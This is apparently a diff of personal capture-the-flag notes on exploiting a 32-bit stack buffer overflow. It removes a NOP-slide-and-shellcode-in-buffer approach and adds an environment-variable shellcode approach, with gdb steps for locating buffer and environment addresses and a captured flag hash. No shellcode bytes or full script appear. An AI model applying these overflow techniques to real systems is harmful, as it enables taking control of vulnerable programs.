@@ -265,40 +265,6 @@ and the buffer result is only of 42 octet inside the stack !
 so is really easy to overridth the eip pointer in the stack 
 
 
-so to create the buffer the idea is to store a shellcode inside the buffer inside the buffer of p becauseis really big 4104
-but because you use it two time the solution is to make a padding of 100 nop slide juste before the shellcode
-for the res you just need to point the eip inside the addr of the buffer 
-
-so let's start
-
-for the first arg1
-NOP SLIDE * 100 + SHELLCODE
-
-for the second arg2
-offset * 16 + ADDR SHELLCODE
-
-
-so yo need to now the addr of the buffer
-
-   0x080484d0 <+28>:    lea    eax,[ebp-0x1008]
-
-break *p+28
-
-
-(gdb) ni
-0x080484d6 in p ()
-(gdb) x/wx $eax
-0xbfffe680:     0x00000000
-(gdb) 
-
-
-so the addr of the buffer is 0xbfffe680
-- Choose an address between 0xbfffe680 + 61 (0xbfffe6bd)
-         and 0xbfffe680 + 100 (0xbfffe6e4)  
-
-
-a chose a middle like + 80 0xbfffe6d0
-
 
 
 gef➤  pattern search $eip
@@ -316,3 +282,20 @@ so the end of the 9 element after the end of the last buffer
 9 + 4 + 7
 
 
+so how to exploit the idea is to create a shell code inside the env and put the addr to eip to return to env 
+
+so how to get the addr of the env ?
+
+juste really easy 
+
+
+(gdb) x/x environ
+xxx : 0xbffff840
+(gdb) x/10s 0xbffff840
+0xbffff840:	 "LC_PAPER=de_CH.UTF-8"
+
+and found the addres !
+0xbfffff8f:	 "PAYLOAD=a"
+
+flag !
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
